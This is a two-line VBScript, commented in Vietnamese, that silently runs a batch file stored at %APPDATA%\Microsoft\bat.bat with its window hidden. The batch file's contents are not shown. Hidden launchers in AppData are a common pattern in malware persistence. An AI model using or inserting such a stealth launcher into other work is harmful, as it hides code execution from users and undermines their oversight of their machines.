Set WshShell = CreateObject("WScript.Shell")' Chạy file bat ở chế độ ẩn hoàn toàn (tham số 0)

WshShell.Run "cmd.exe /c %APPDATA%\Microsoft\bat.bat", 0, False